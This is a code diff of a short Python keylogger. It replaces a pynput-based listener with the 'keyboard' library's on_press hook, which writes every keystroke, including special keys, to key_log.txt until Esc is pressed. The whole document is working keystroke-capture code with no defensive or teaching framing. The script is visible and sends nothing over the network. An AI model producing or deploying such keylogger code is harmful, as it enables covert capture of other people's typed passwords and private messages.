@@ -1,21 +1,23 @@
-from pynput import keyboard
+import keyboard
 
 # Specify the log file
 log_file = "key_log.txt"
 
-def on_press(key):
-    try:
-        with open(log_file, "a") as f:
-            f.write(f"{key.char}")
-    except AttributeError:
-        with open(log_file, "a") as f:
-            f.write(f" {key} ")
+def on_key_event(event):
+    with open(log_file, "a") as f:
+        if event.name == 'space':
+            f.write(' ')
+        elif event.name == 'enter':
+            f.write('\n')
+        elif len(event.name) > 1:
+            f.write(f' <{event.name}> ')
+        else:
+            f.write(event.name)
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        # Stop listener
-        return False
+# Set up the keylogger
+keyboard.on_press(on_key_event)
 
-# Collect events until released
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+print("Keylogger is running... Press 'Esc' to stop.")
+
+# Keep the program running until 'Esc' is pressed
+keyboard.wait('esc')
